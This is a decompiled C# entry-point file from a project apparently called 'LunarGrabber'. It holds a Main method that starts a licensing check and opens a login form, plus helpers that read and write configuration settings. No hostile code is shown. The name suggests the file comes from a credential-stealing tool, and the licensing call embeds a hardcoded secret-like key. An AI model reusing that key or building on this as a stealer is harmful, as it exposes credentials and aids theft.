using System;
using System.Configuration;
using System.Windows.Forms;

namespace LunarGrabber
{
	// Token: 0x02000020 RID: 32
	public static class Program
	{
		// Token: 0x060000DB RID: 219 RVA: 0x0000D9B6 File Offset: 0x0000BBB6
		[STAThread]
		public static void Main()
		{
			OnProgramStart.Initialize("Asteroid", "79248", "3SHd65TViYwPjBc2CrJEo1BeRP2f4kuI46F", "1.9");
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new LoginForm());
		}

		// Token: 0x060000DC RID: 220 RVA: 0x0000D9E8 File Offset: 0x0000BBE8
		public static void SetValue(string key, string value)
		{
			Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
			KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
			if (settings[key] == null)
			{
				settings.Add(key, value);
			}
			else
			{
				settings[key].Value = value;
			}
			configuration.Save(ConfigurationSaveMode.Modified);
			ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000DA44 File Offset: 0x0000BC44
		public static string GetValue(string key)
		{
			return ConfigurationManager.AppSettings[key];
		}
	}
}
